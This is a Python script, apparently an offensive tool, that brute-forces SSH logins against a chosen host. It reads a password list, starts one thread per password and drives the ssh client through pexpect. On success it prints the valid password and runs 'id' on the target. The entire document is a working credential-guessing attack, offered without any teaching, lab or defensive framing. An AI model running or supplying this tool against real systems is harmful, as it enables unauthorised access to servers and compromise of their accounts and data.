#!/usr/bin/python3

import pexpect
import optparse
from threading import Thread
from termcolor import colored


PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT, timeout=2)


def connect_ssh(host, port, username, password):
    try:
        ssh_newkey = 'Are you sure you want to continue connecting'

        conn_str = 'ssh -l {} {} -p{}'.format(username, host, port)

        child = pexpect.spawn(conn_str)

        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
        if ret == 0:
            print('[-] Error connecting 1')
            return None
        elif ret == 1:
            child.sendline('yes')
            ret = child.expect([pexpect.TIMEOUT, 'nomatch', '[P|p]assword:'])
            if ret == 0:
                print('[-] Error connecting 2')
                return None

        if ret == 2:
            send_command(child, password)
            print('Found valid credentials: {}'.format(password))
            send_command(child, 'id')
            print(child.before.decode('utf-8'))
            exit(0)
    except Exception as e:
        pass


def main():
    parser = optparse.OptionParser('Usage: ./main.py -H <host> -p <port> -u <username> -P <password_list>')
    parser.add_option('-H', dest='host', type='string', help='Target host')
    parser.add_option('-p', dest='port', type='string', help='Port')
    parser.add_option('-u', dest='username', type='string', help='Username')
    parser.add_option('-P', dest='password_list', type='string', help='Password list')
    (options, args) = parser.parse_args()

    if not options.password_list or not options.username or not options.host or not options.port:
        print(parser.usage)
        exit(0)

    with open(options.password_list) as f:
        for line in f:
            t = Thread(target=connect_ssh, args=(options.host, options.port, options.username, line.strip()))
            t.start()


if __name__ == '__main__':
    main()
